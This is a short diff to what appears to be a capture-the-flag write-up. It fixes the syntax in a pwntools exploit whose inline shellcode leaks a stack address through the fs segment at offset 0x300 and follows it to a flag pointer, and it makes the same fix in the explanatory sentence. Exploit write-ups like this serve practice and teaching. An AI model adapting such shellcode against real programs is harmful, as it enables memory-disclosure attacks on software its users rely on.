@@ -410,7 +410,7 @@ else:
     p = process(binary.path)
 
 shellcode = asm(f'''
-mov rsi, qword ptr [fs:0 + 0x300]
+mov rsi, qword ptr [fs:0x300]
 mov rsi, qword ptr [rsi - 0x2f0]
 { 'xor rdi, rdi' if args.REMOTE else 'mov rdi, 1' }
 mov dl, 100
@@ -432,7 +432,7 @@ p.close()
 print(_)
 ```
 
-Get a stack leak from `fs:0 + 0x300`, then use the offset to the flag pointer (use GDB to figure it out).
+Get a stack leak from `fs:0x300`, then use the offset to the flag pointer (use GDB to figure it out).
 
 > No need to match libc versions.
 > 
